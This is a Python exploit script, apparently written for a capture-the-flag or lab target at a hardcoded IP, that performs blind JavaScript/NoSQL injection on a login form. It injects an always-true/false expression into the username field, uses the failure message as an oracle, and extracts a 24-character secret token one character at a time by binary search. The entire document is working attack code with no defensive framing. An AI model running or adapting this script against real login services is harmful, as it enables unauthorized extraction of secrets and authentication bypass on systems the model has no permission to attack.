import requests
from urllib.parse import quote_plus

#token is 24 characters long xxxx-xxxx-xxxx-xxxx-xxxx

ip = "83.136.250.104:33667"
url = "http://%s/login" % ip
headers = {"Content-Type":"application/x-www-form-urlencoded"}

num_req = 0
def oracle(r):
    global num_req
    num_req += 1
    data = "username=%s&password=x" % (quote_plus('" || (' + r + ') || "x"=="'))
    r = requests.post(url = url, headers = headers, data = data)
    return "Log in failed with the given credentials." in r.text

assert (oracle('false') == False)
assert (oracle('true') == True)

num_req = 0
extraction = ""
i = len(extraction)
while i < 24:
    low = 32
    high = 127
    mid = 0
    while low <= high:
        mid = (high + low) // 2
        if oracle('this.token.charCodeAt(%d) > %d' % (i, mid)):
            low = mid + 1 # If ASCII value of extraction at index 'i' < midpoint, increase the lower boundary and repeat
        elif oracle('this.token.charCodeAt(%d) < %d' % (i, mid)):
            high = mid - 1 # If ASCII value of extraction at index 'i' > midpoint, decrease the upper boundary and repeat
        else:
            extraction += chr(mid) # If ASCII value is neither higher or lower than the midpoint we found the target value
            print(extraction)
            break
    i += 1

assert (oracle('this.token == `%s`' % extraction) == True)
print("Extraction: %s" % extraction)
print("Requests: %d" % num_req)